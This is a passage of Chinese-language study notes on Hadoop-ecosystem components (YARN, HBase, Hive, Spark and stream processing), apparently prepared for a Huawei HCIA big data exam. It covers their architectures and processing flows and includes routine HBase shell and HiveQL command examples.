V1资源调度出现的问题</h2><ul><li>如果发生问题，通知用户介入解决</li><li>没有区分任务调度和资源调度，都是MR的主节点在处理，主节点的整体工作压力非常大</li><li>因为资源没有单独隔离,容易出现资源抢占的问题</li></ul><h1 id="Yarn"><a href="#Yarn" class="headerlink" title="Yarn"></a>Yarn</h1><pre><code>资源调度管理服务---&gt; 可以协助其他组件应用协调管理资源，以及任务调度</code></pre><h2 id="Yarn的系统架构"><a href="#Yarn的系统架构" class="headerlink" title="Yarn的系统架构"></a>Yarn的系统架构</h2><pre><code>在集群层面来说只有一个ResourceManager, 多个NodeManager以程序执行层面来说，一个应用只有一-个AppMaster,多个Container</code></pre><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_11.png" alt="Yarn的系统架构"></p><ul><li>Client:客户端</li><li>ResourceManager (主节点) :负责资源管理,任务调度</li><li>NodeManager (从节点) :负责提供资源，实际任务执行</li><li>ApplicationMaster:特殊的Container, 管理同一应用的其他Container,以及实时关注任务执行状态,反馈给RM</li><li>Container:<code>资源的抽象</code>，被封装起来的资源，一个Container执行一个任务, 其他任务不能使用这个Container的资源</li></ul><h2 id="MapReduce-On-Yarn任务处理流程"><a href="#MapReduce-On-Yarn任务处理流程" class="headerlink" title="MapReduce On Yarn任务处理流程"></a><code>MapReduce On Yarn任务处理流程</code></h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_12.png" alt="MapReduce On Yarn任务处理流程"></p><ol><li>Client向RM发起请求</li><li>RM(ApplicationManager)接收到请求后在NM中启动一-个AppMaster</li><li>AppMaster接收任务，根据任务向RM (ResourceScheduler) 申请资源</li><li>在NM中封装资源Container提供给AppMaster执行应用</li><li>执行过程中Container会实时反馈执行状态给AppMaster</li><li>AppMaster会反馈任务执行状态和自身状态给RM (ApplicationManager)</li><li>AppMaster将运行结果反馈给RM,然后向RM (ResourceScheduler) 申请释放资源</li><li>RM将任务情况反馈给Client</li></ol><p>Yarn搭建时支持主备配置，实现主备ResourceManager<br>AppMaster的容错(当-个AppMaster出现故障,任务管理会被迁移到新的AppMaster)</p><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_13.png" alt="AppMaster的容错"></p><h1 id="HBase"><a href="#HBase" class="headerlink" title="HBase"></a>HBase</h1><pre><code>HBase分布式列式NoSQL数据库，底层存储使用的是HDFS ,`没有数据类型，所有数据存储都是字节数组的形式byte[]`创建者:道格卡廷出发点:搜索引擎--&gt;提高数据读写速度--&gt; BigTable</code></pre><h2 id="HBase的特性"><a href="#HBase的特性" class="headerlink" title="HBase的特性"></a>HBase的特性</h2><ul><li>可扩展性:可以通过添加节点的方式增加数据存储空间</li><li>高可靠性:底层使用HDFS,能够保证数据的可靠性，预写式日志保证内存中的数据不丢失</li><li>高性能:处理PB级别的数据</li><li>面向列: HBase数据存储是面向列的</li><li>可伸缩性:动态添加列(在添加数据的时候)-</li></ul><h2 id="面向列、面向行数据库的优缺点"><a href="#面向列、面向行数据库的优缺点" class="headerlink" title="面向列、面向行数据库的优缺点"></a>面向列、面向行数据库的优缺点</h2><ul><li>面向行:<br>  优点:能方便快捷的获取一一行记录<br>  缺点:在想要单独获取指定列数据的时候，会检索到其他无关列</li><li>面向列:<br>  优点:在检索单列数据时，不会出现无关列<br>  缺点:想要查询一条记录时，需要多次IO请求才能拼出一条记录</li></ul><h2 id="HBase和RDB-关系型数据库-的区别比较"><a href="#HBase和RDB-关系型数据库-的区别比较" class="headerlink" title="HBase和RDB (关系型数据库)的区别比较"></a>HBase和RDB (关系型数据库)的区别比较</h2><ul><li>数据索引: <br>HBase只有一 种索引(rowkey)，RDB中可以配置多个索引</li><li>数据维护: <br>HBase允许数据增删查,<code>不支持修改</code>，RDB中允许数据增删查改<br>HBase可以使用覆盖的方式写入数据以此实现数据修改的功能<br>可伸缩性: HBase可以在添加数据时动态添加列，RDB只能通过修改表的方式添加列<br>RDB (MySQL) 数据模型:数据库、表、行、列(字段)，单元格</li></ul><h2 id="HBase数据模型"><a href="#HBase数据模型" class="headerlink" title="HBase数据模型"></a>HBase数据模型</h2><pre><code>命名空间、表、行、列(组成列族)、单元格(可以存储多条记录)</code></pre><ul><li>命名空间: hbase、 default. 自定义(在使用自定义的命名空间时都需要指定命名空间名称)</li><li>表:由行和列组成</li><li>行:有一个唯一表示行键(rowkey)</li><li>列:归属于某一个列族(<code>动态添加</code>)</li><li>列族:由一个或多个列组成(创建表时创建的，不能动态更改)</li><li>单元格:由行和列能确定-一个单元格，<code>一个单元格中可能存在多条记录(多版本记录，使用时间戳进行区分)</code></li></ul><h2 id="HBase的表结构"><a href="#HBase的表结构" class="headerlink" title="HBase的表结构"></a>HBase的表结构</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_14.png" alt="HBase的表结构"></p><pre><code>要找到行列对应的单元格值时，表行键,列族:列默认情况下，只返回单元格中的最新记录，如果要返回多版本需要指定参数VERSIONS=&gt;3</code></pre><h2 id="HBase系统架构"><a href="#HBase系统架构" class="headerlink" title="HBase系统架构"></a>HBase系统架构</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_15.png" alt="HBase系统架构"></p><ul><li>Client:用户可以通过Client连接到HBase,基本不与HMaster交互</li><li>ZooKeeper:监测HMaster的主备运行状态及主备切换，监测HRegionServer的状态，反馈给HMaster,<code>存储HBase元数据信息hbase:meta</code></li><li>Hmaster() ：管理维护HRegionServer列表，管理分配Region, Region负载均衡</li><li>HRegionServer：管理分配给它的Region，处理用户的读写请求</li><li>DFS Client: HBase连接到HDFS的接口</li></ul><p>一个HRegionserver中包含一个HLog， 多个HRegion</p><ul><li><p>HLog:预写式日志WAL,记录数据操作(数据写入之前必须先写入HLog)</p></li><li><p>Region:<code>分布式存储的最基本单位，刚开始一个Region存储一个表的内容随着数据增多</code>，Region会不断分裂<br>Store:一个Region中包含多个Store,<code>一个Store存储一个列族数据</code><br>MemStore (写缓存):一个Store包含一个MemStore <br>StoreFile (磁盘文件):一个Store中包含多个StoreFile<br>HFile (HDFS文件): 一个StoreFile添加头部信息转换成HFile,最终存储在HDFS中</p></li><li><p>数据写入关键流程:先写入HLog,然后才能写入MemStore,当MemStore达到溢出要求(128M) ,将数据刷写StoreFile中</p></li><li><p>数据读取关键流程:先读取MemStore,如果没有,再读取BlockCache (读缓存)，如果还是没有最终才读取StoreFile<br>BlockCache存储之前的用户查询过的数据，当MemStore和BlockCache中都没有数据， 需要从StoreFile<br>中读取数据时，读取完的数据会被加载到BlockCache中</p></li></ul><h2 id="Region拆分"><a href="#Region拆分" class="headerlink" title="Region拆分"></a>Region拆分</h2><ul><li>拆分原因:数据不断增加，region不断增大， region过大会影响数据读写速度</li><li>拆分条件:根据行键拆分，尽可能将同一个行键或相似的行键放在一个Region中</li></ul><p>-region拆分过程很快，接近瞬间,在拆分时实际还是请求的原文件,拆分结束之后会将原文件内容异步写入新文件,然后之后的请求被转移到新文件</p><h2 id="Region定位"><a href="#Region定位" class="headerlink" title="Region定位"></a>Region定位</h2><p>  元数据信息存储在hbase:meta中,这个表信息被存储在zookeeper内存中通过元数据信息获取Region实际存储位置</p><h2 id="HRegionServerBR"><a href="#HRegionServerBR" class="headerlink" title="HRegionServerBR"></a>HRegionServerBR</h2><p>H RegionServer出现故障时</p><ol><li>zookeeper发现RegionServer故障，同时HMaster</li><li>HMaster获取故障的RegionServer上的HLog信息，根据与Region的对应关系对HLog进行拆分</li><li>把HLog存放在Region目录下，把Region重新迁移至其他的RegionServer上</li><li>其他的RegionServer接收到Region执行重新执行HLog内容</li></ol><h2 id="HLog的工作原理"><a href="#HLog的工作原理" class="headerlink" title="HLog的工作原理"></a>HLog的工作原理</h2><ul><li>HLog: WAL预写式日志，数据更新的操作都要先写入HLog中，才能写入MemStore<br><code>当MemStore被刷写到磁盘后，会向HLog中写入一条标记记录 (标记记录之前的所有数据都已经刷写到磁盘)</code></li><li>系统启动时，系统任务先扫描HLog, 检测是否有数据没有写入到磁盘中,如果有先执行写入MemStore,然后再刷写到磁盘，清空缓存,最后再为用户提供服务 <br>如果数据丢失，可以根据HLog重新执行恢复</li><li>一个RegionServer只有一-个HLog (共用一个HLog)<br>  优点:写入日志时不需要查找对应的Log,直接全部写入一个HLog<br>  缺点:如果RegionServer出现故障， 需要对HLog进行拆分</li></ul><h2 id="缓存刷写-把MemStore数据写入到StoreFile中"><a href="#缓存刷写-把MemStore数据写入到StoreFile中" class="headerlink" title="缓存刷写(把MemStore数据写入到StoreFile中)"></a>缓存刷写(把MemStore数据写入到StoreFile中)</h2><ul><li>当MemStore达到刷写条件，就会将内容刷写到StoreFile文件中</li><li>缓存的刷写是针对整个Region的，当一个MemStore达到刷写要求， 当前的Region下面的所有MemStore都会触发刷写</li><li>每次刷写都会生成一个新的StoreFile文件(每次的刷写内容都分别在一个新文件中)</li><li>刷写完成之后会在HLog中写入标记记录,并且清空缓存</li></ul><h2 id="StoreFile的合并"><a href="#StoreFile的合并" class="headerlink" title="StoreFile的合并"></a>StoreFile的合并</h2><pre><code>(刷写操作会出现大量的StoreFile,且部分StoreFile文件大小过小) 合并比较消耗资源,达到一定阈值才会执行将多个的StoreFile小文件合并成一个大文件,如果StoreFile文件过大，再进行拆分(根据HDFS块进行拆分)</code></pre><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_16.png" alt="StoreFile的合并"></p><p>合并文件会进行筛选:如果本身的StoreFile就已经达到1 00M左右,这个StoreFile是不参与合并的</p><h2 id="HBase读取流程"><a href="#HBase读取流程" class="headerlink" title="HBase读取流程"></a>HBase读取流程</h2><ol><li>Client请求zookeeper获取hbase:meta表元数据信息，获取RegionServer信息</li><li>Client请求相对应的RegionServer</li><li>RegionServer接收到请求反馈数据给Client</li><li>关闭读取流</li></ol><h2 id="HBase写入流程"><a href="#HBase写入流程" class="headerlink" title="HBase写入流程"></a>HBase写入流程</h2><ol><li>Client请求的zookeeper,获取hbase:meta表信息,根据写入的行键获取对应的RegionServer信息</li><li>Client请求RegionServer发起写入请求</li><li>RegionServer接收到请求后将数据写入到行键对应的Region中.</li><li>RegionServer反馈写入状态给Client</li><li>关闭写入流</li></ol><h2 id="BloomFilter-布隆过滤器"><a href="#BloomFilter-布隆过滤器" class="headerlink" title="BloomFilter (布隆过滤器)"></a>BloomFilter (布隆过滤器)</h2><pre><code>判断数据是否存在，如果反馈结果为不存在，是可信的，如果反馈结果为存在，可能有误差</code></pre><p>缩小数据违取范围<br><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_17.png" alt="布隆过滤器"></p><p>在HBase中行键是以字典序进行排序<br><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_18.png" alt="以字典序进行排序"></p><h2 id="HBase-Shell命令"><a href="#HBase-Shell命令" class="headerlink" title="HBase Shell命令"></a>HBase Shell命令</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">namespace:</span><br><span class="line">    create_namespace <span class="string">&#x27;名称&#x27;</span></span><br><span class="line">    list_namespace</span><br><span class="line">    list_namespace_ tables <span class="string">&#x27;ns1&#x27;</span></span><br><span class="line">    alter_namespace <span class="string">&#x27;ns1 ,&#123;属性名称=&gt; &#x27;</span>属性值&#125;</span><br><span class="line">    drop_ namespace <span class="string">&#x27;ns1&#x27;</span> <span class="comment">---命名空间需要是空的</span></span><br><span class="line"></span><br><span class="line">ddl:数据定义语言<span class="comment">---&gt; 表层面的操作</span></span><br><span class="line">    <span class="keyword">create</span> <span class="string">&#x27;表名&#x27;</span>,列族名<span class="number">1</span><span class="string">&#x27;;列族2&#x27;</span></span><br><span class="line">    <span class="keyword">create</span> <span class="string">&#x27;表名,&#123;NAME= &gt; &#x27;</span>列族<span class="string">&#x27; VERSIONS= &gt; 5&#125;,&#123;NAME= &gt;列族&#x27;</span> ,VERSIONS<span class="operator">=</span> <span class="operator">&gt;</span><span class="number">5</span>&#125;</span><br><span class="line">    修改列族属性信息、添加列族: <span class="keyword">alter</span> <span class="string">&#x27;表名&#x27;</span>,&#123;NAME<span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;列族&#x27;</span> ,VERSIONS<span class="operator">=</span><span class="operator">&gt;</span><span class="number">5</span>&#125;<span class="comment">--&gt;如果列族存在做修改，不存在做添加</span></span><br><span class="line">    使用list可以查看所有的表:包含<span class="keyword">default</span>命名空间和自定义命名空间中的表</span><br><span class="line">    查看表信息: <span class="keyword">describe</span> <span class="string">&#x27;表名&#x27;</span></span><br><span class="line">    删除表: <span class="keyword">drop</span> <span class="string">&#x27;表名’--&gt; 禁用状态的表才 能进行删除</span></span><br><span class="line"><span class="string">    禁用表: disable 表名&#x27;</span> <span class="operator">/</span>启用表: enable <span class="string">&#x27;表名&#x27;</span></span><br><span class="line">    </span><br><span class="line">dml:数据管理语言<span class="comment">--&gt; 针对数据层面的操作</span></span><br><span class="line">    添加数据: put <span class="string">&#x27;表名，’行键&quot;,列族:列&quot;,值’--&gt; 默认使用的是系统时间戳</span></span><br><span class="line"><span class="string">    删除数据: delete &#x27;</span>表名&quot;;行键’</span><br><span class="line">    delete表名&#x27;,行键&quot;，列族:列<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    delete表名&#x27;</span>;行键&quot;,列族列,&#123;TIMESTEMP= &gt;&#x27;235652&#x27;&#125;</span><br><span class="line">    清空表: truncate &#x27;表名&#x27;</span><br><span class="line">    数据获取: get &#x27;表名&#x27;;行键’</span><br><span class="line">    get &#x27;表名&#x27;行键&quot;;列族列</span><br><span class="line">    <span class="keyword">get</span> <span class="string">&#x27;表名&#x27;</span>，<span class="string">&#x27;行键&quot;;列族列,&#123;VERSIONS=&gt;3&#125;</span></span><br><span class="line"><span class="string">    数据扫描: scan &#x27;</span>表名<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    scan &#x27;</span>表名&quot;&#x27;;行键&#x27;;列族列,VERSIONS= &gt;3&#125;</span><br><span class="line"></span><br><span class="line">snapshot:快照操作--&gt; 针对表创建快照，记录当前指定表的数据信息</span><br><span class="line">    创建快照: snapshot &#x27;表名&quot;，<span class="string">&#x27;快照名称&#x27;</span></span><br><span class="line">    还原快照: resotre_ snapshot <span class="string">&#x27;快照名&#x27;</span></span><br><span class="line">    克隆快照: clone_ snapshot ‘快照名;新表名<span class="string">&#x27; ---&gt;把快照中的表内容还原到一-张新表上</span></span><br><span class="line"><span class="string">    删除快照: delete snapshot &#x27;</span>快照名<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Hive"><a href="#Hive" class="headerlink" title="Hive"></a>Hive</h1><pre><code>数据仓库，查询分析</code></pre><h2 id="Hadoop生态圈"><a href="#Hadoop生态圈" class="headerlink" title="Hadoop生态圈"></a>Hadoop生态圈</h2><ul><li>HDFS存储、 HBase存储提供实时读写功能</li><li>MapReduce并行计算、Yarn资源管理和任务调度</li><li>ZooKeeper协助分布式应用管理服务</li><li>Hive底层使用的是MapReduce做计算，MapReduce的使用对编程人员要求比较高</li><li>可以执行SQL类的查询分析计算</li></ul><h2 id="Hive数据模型"><a href="#Hive数据模型" class="headerlink" title="Hive数据模型"></a>Hive数据模型</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_19.png" alt="Hive数据模型"></p><ul><li><p>分区:根据字段值进行划分(指定分区字段,分区字段值相同的记录就存放在一一个分区中)<br>分区在物理上是一个文件夹<br>分区下还可以再有分区和桶<br>在创建表的时候可以指定分区字段<br>分区数量是不固定的</p></li><li><p>桶:根据值的哈希值进行求余放到对应的桶中<br>桶在物理.上是一-个文件<br>在创建表的时候可以指定有几个桶</p></li><li><p>表类型:托管表(内部表)、外部表、临时表<br>托管表(internal) :元数据和数据信息都是Hive在管理<br><code>删除时，元数据和数据都会被删除\</code><br>外部表(external) :元数据由Hive管理,但是数据可以提供给其他组件共享<br><code>删除时，只删除元数据，数据信息依旧保留\</code><br>临时表(temporary) :只在当前会话中生效，当会话结束表就会被自动删除</p></li></ul><h2 id="Hive数据仓库分层-逻辑分层"><a href="#Hive数据仓库分层-逻辑分层" class="headerlink" title="Hive数据仓库分层(逻辑分层)"></a>Hive数据仓库分层<code>(逻辑分层)</code></h2><ul><li>ODS (原数据层，操作数据层) :从数据源获取到的数据</li><li>DWD (数据明细层) :根据ODS做数据清洗得到的结果</li><li>DWS (数据服务层) :根据DWD进行汇总分析计算</li><li>ADS (应用服务层) :根据上层应用的业务需求将DWS数据再一次处理分析得到业务 需要的数据</li></ul><h2 id="Hive的分层处理的优势"><a href="#Hive的分层处理的优势" class="headerlink" title="Hive的分层处理的优势"></a>Hive的分层处理的优势</h2><ul><li>复杂问题简单化:将复杂问题分成多个流程，每个层面执行一-一个流程内容</li><li>减少重复开发:不要每次提供给上次应用数据时都要对数据进行清洗汇总操作</li><li>隔离原始数据:减少到原数据的依赖，避免因为原数据的原因，导致后续操作无法执行</li></ul><h2 id="Hive-SQL的使用"><a href="#Hive-SQL的使用" class="headerlink" title="Hive SQL的使用"></a>Hive SQL的使用</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">DDL:数据定义语言</span><br><span class="line">    创建表: <span class="keyword">create</span> <span class="keyword">table</span> <span class="string">&#x27;表名(字段类型,字段2类类型... .);</span></span><br><span class="line"><span class="string">    create external table表名&#x27;</span>(字段类型,字段<span class="number">2</span>类型....</span><br><span class="line">    <span class="keyword">create</span> temporary <span class="keyword">table</span> <span class="string">&#x27;表名&#x27;</span>(字段类型,字段<span class="number">2</span>类型... .</span><br><span class="line">    修改表: <span class="keyword">alter</span> <span class="keyword">table</span>表名<span class="string">&#x27; rename to &#x27;</span>新表名;</span><br><span class="line">    <span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">&#x27;表名&#x27;</span> addcolumns (字段类型);</span><br><span class="line">    删除表: <span class="keyword">drop</span> <span class="keyword">table</span> <span class="string">&#x27;表名&#x27;</span>;</span><br><span class="line">    查询数据库中的所有表: <span class="keyword">show</span> tables;</span><br><span class="line">    查看表信息: <span class="keyword">describe</span> <span class="keyword">table</span> <span class="string">&#x27;表名&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">DML:数据管理语言</span><br><span class="line">    添加数据:从文件中添加到表中</span><br><span class="line">    load data inpath HDFS路径<span class="keyword">into</span> <span class="keyword">table</span>表名</span><br><span class="line">    load data <span class="keyword">local</span> inpath Linux路径<span class="keyword">into</span> <span class="keyword">table</span>表名</span><br><span class="line">    load data <span class="keyword">local</span> inpath Linux路径overwrite <span class="keyword">into</span> <span class="keyword">table</span>表</span><br><span class="line">    </span><br><span class="line">    从一个表添加到另<span class="operator">-</span>一个表中</span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> 表名 <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 原表 <span class="keyword">where</span>条件;</span><br><span class="line">    <span class="keyword">from</span> 原表 <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> 表名 <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">where</span> 条件</span><br><span class="line">    <span class="keyword">from</span> 原表 <span class="keyword">insert</span> overwrite <span class="keyword">table</span> 表名 <span class="keyword">select</span> 字段 <span class="keyword">where</span> 条件</span><br><span class="line">    从表中导出到文件中</span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> directory HDFS路径 <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>表</span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">local</span> directory Linux 路径<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表</span><br><span class="line">    export <span class="keyword">table</span> 表 <span class="keyword">to</span> HDFS路径</span><br><span class="line">    </span><br><span class="line">DQL:数据查询语言</span><br><span class="line">    标准查询: <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>表名</span><br><span class="line">    分组: <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">group</span> <span class="keyword">by</span>字段</span><br><span class="line">    排序: <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span>字段<span class="keyword">desc</span></span><br><span class="line">    多表联合查询: <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表 a <span class="keyword">join</span> 表b  <span class="keyword">on</span> a.id<span class="operator">=</span> b.id)</span><br><span class="line">    </span><br><span class="line">创建表时的特殊操作</span><br><span class="line">    分区: partitioned (字段类型)</span><br><span class="line">    指定列分隔符: <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;分隔符&#x27;</span></span><br><span class="line">    指定外部表的存储路径: location 路径</span><br><span class="line">    指定外部表的存储类型: stored <span class="keyword">as</span> textfile</span><br><span class="line">    指定字段加密: <span class="type">ROW</span> FORMAT SERDE</span><br><span class="line">    <span class="string">&#x27;org.apache.hadoop.hive.serde2.lazy.LazySimpleSerDe&#x27;</span> <span class="keyword">WITH</span> SERDEPROPERTIES(</span><br><span class="line">    <span class="string">&#x27;column.encode.columns&#x27;</span><span class="operator">=</span><span class="string">&#x27;字段1,字段</span></span><br><span class="line"><span class="string">    2&#x27;</span>column.encode.classname<span class="string">&#x27; =&#x27;</span>org apache.hadoop.hive.serde2.AESRewriter);</span><br></pre></td></tr></table></figure><h1 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h1><h2 id="Spark特点"><a href="#Spark特点" class="headerlink" title="Spark特点"></a>Spark特点</h2><pre><code>轻快灵巧Spark的处理能力是MapReduce的30倍，处理能力不容易受到任务量增加的影响</code></pre><p>轻:底层代码只有3万行，使用的函数式编程语言scala<br>快:处理速度快<br>灵:提供很多不同层面的处理功能<br>巧:巧妙的应用Hadoop平台</p><h2 id="RDD-分布式数据集、可分区的"><a href="#RDD-分布式数据集、可分区的" class="headerlink" title="RDD:分布式数据集、可分区的"></a>RDD:分布式数据集、可分区的</h2><ul><li>具有血统机制(RDD由父RDD执行操作之后产生)</li><li>如果子RDD丢失，RDD故障，重新执行父RDD就可以重新得到的子RDD</li><li>RDD默认存储在内存中，如果内存不足的时候，发生溢写</li><li>Spark节点会分配60%的内存用于做缓存，40%执行内存</li></ul><h2 id="依赖类型"><a href="#依赖类型" class="headerlink" title="依赖类型"></a>依赖类型</h2><pre><code>宽依赖、窄依赖</code></pre><ul><li>窄依赖:父RDD的每个分区都只会被<code>一个</code>子RDD的分区所依赖</li><li>宽依赖:父RDD的每个分区可能会被<code>多个子RDD的分区所依赖</code></li></ul><h2 id="Stage划分"><a href="#Stage划分" class="headerlink" title="Stage划分"></a>Stage划分</h2><pre><code>遇到窄依赖就加入，宽依赖就断开，剩余的所有RDD被放在一个Stage中</code></pre><h2 id="RDD操作类型"><a href="#RDD操作类型" class="headerlink" title="RDD操作类型"></a>RDD操作类型</h2><ul><li><p>创建操作:创建RDD用于接收数据结果</p></li><li><p>原始RDD:读取数据源获得的RDD (readFile(path))</p></li><li><p>转换得来:通过父RDD执行操作后得到的子RDD</p></li><li><p>控制操作:持久化RDD,可以持久化到内存或磁盘中,默认存在内存</p></li><li><p>转换操作:可对RDD执行的处理操作，转换操作是懒惰的，转换操作并不是立马执行，遇到行动操作才执行</p></li><li><p>行动操作:实际调用Spark执行(存储文件,数据输出等)</p></li><li><p>transformation算子在整个程序中 -&gt;声明转换操作,实际并没有执行</p></li><li><p>action算子时， 会从第一-个操作开始执行</p></li><li><p>DataFrame:属于一个DataSet实例， 不可变的弹性分布式数据集，存储数据时不止存储数据内容,存储数据对应结构信息及类型</p></li><li><p>DataSet:以对象的形式存储数据集，DataFrame&#x3D; DataSet[Row]</p></li></ul><h2 id="RDD、DataFrame、-DataSet数据集的联系"><a href="#RDD、DataFrame、-DataSet数据集的联系" class="headerlink" title="RDD、DataFrame、 DataSet数据集的联系"></a>RDD、DataFrame、 DataSet数据集的联系</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_20.png" alt="数据集的联系"></p><h2 id="Spark体系架构"><a href="#Spark体系架构" class="headerlink" title="Spark体系架构"></a>Spark体系架构</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_21.png" alt="Spark体系架构"></p><ul><li>集群部署形式: <br>Standalone: spark自 己管理资源调度<br>Spark On Yarn:使用yarn做资源管理调度 <br>Mesos: AMR实验室开发的资源管理器，最适用于Spark的资源管理器</li><li>Spark Core:处理核心</li><li>Spark SQL:处理结构化数据，使用Hive元数据</li><li>Spark Streaming:实时流处理(实际微批处理) , 能够低延迟的计算反馈结果</li><li>MLLib:机器学习,根据历史数据进行建模，根据模型和提供的数据进行数据预测</li><li>GraphX:图计算,主要用于关系统计,关系查询</li><li>SparkR: R语言库,提供R语言接口，可以使用R语言操作Spark</li><li>Structured Streaming:流处理，将数据存入-个无边界表(新数据不断添加，旧数据不断移除)使用增量的方式获取表数据内容进行执行</li></ul><h1 id="Streaming"><a href="#Streaming" class="headerlink" title="Streaming"></a>Streaming</h1><pre><code>分布式流处理组件</code></pre><h2 id="关键特性-实时响应，延迟性低"><a href="#关键特性-实时响应，延迟性低" class="headerlink" title="关键特性:实时响应，延迟性低"></a>关键特性:实时响应，延迟性低</h2><ul><li>数据不存储先执行(离线处理先存储数据然后再执行)</li><li>连续查询(程序运行后就不终止,除非系统故障导致的终止或者手动停止)</li><li>事件驱动:传入的数据信息触动任务处理</li></ul><h2 id="Streaming系统架构"><a href="#Streaming系统架构" class="headerlink" title="Streaming系统架构"></a>Streaming系统架构</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_22.png" alt="Streaming系统架构"></p><ul><li>Client:客户端接口</li><li>Nimbus (主节点) :接收客户端的请求，管理Supervisor从节点，管理任务分配，编写任务书</li><li>Supervisor (从节点) :实行任务，管理worker</li><li>Worker (进程) :程序执行</li><li>Executor (线程) :每个Executor中默认执行一 一个Task</li><li>Task (任务) : Task分别对应每一 个Spout&#x2F;Bolt组件的执行 </li><li>ZooKeeper:监控Nimbus主节点的状态，如果主节点故障切换备用节点<br>监控Supervisor从节点状态，如果从节点故障,通知Nimbus迁移任务，启动自动恢复<br>接收Nimbus任务书，将每个从节点的任务存放在每个Supervisor自己对应的目录中</li></ul><h2 id="Streaming任务架构"><a href="#Streaming任务架构" class="headerlink" title="Streaming任务架构"></a>Streaming任务架构</h2><ul><li>Topology:拓扑结构,封装任务执行流程</li><li>Spout:发送数据源的组件,接收第三方数据收集I具提供的数据发送到数据流</li><li>每个应用只有一个spout</li><li>Bolt:从数据流中获取数据,执行数据处理，如果当前bolt不是最后-个执行程序将结果放回数据流一个应用中可以有多个bolt</li><li>Tuple:数据流中的数据格式，组件之间数据传输的格式，元组中包含两个参数(id, stream)</li></ul><h2 id="Streaming执行任务"><a href="#Streaming执行任务" class="headerlink" title="Streaming执行任务"></a>Streaming执行任务</h2><ol><li>用户通过Client提交应用到Nimbus中</li><li>Nimbus接收到应用后，根据应用情况及当前集群的从节点情况编写任务书</li><li>将任务书.上传到ZooKeeper中</li><li>ZooKeeper接收到任务书后根据每个节点将对应的任务存放在节点对应的目录下</li><li>Supervisor周期性监测自己在ZooKeeper中的目录有没有新任务</li><li>Supervisor发现新任务，根据任务书内容从Nimbus中下载任务所需要的jar包</li><li>Supervisor执行任务,反馈执行状态给Nimbus .</li><li>Nimbus将任务状态反馈给Client</li></ol><h2 id="根据任务架构执行"><a href="#根据任务架构执行" class="headerlink" title="根据任务架构执行"></a>根据任务架构执行</h2><ol><li>获取拓扑结构</li><li>根据拓扑结构分别找到每一流程的处理单元</li><li>按照路程执行处理单元</li></ol><h2 id="消息传递语义"><a href="#消息传递语义" class="headerlink" title="消息传递语义"></a>消息传递语义</h2><ul><li>最多一次:数据发送只发送一次, 可靠性最低，吞吐量最大<br>  缺点:可能存在数据丢失的情况<br>  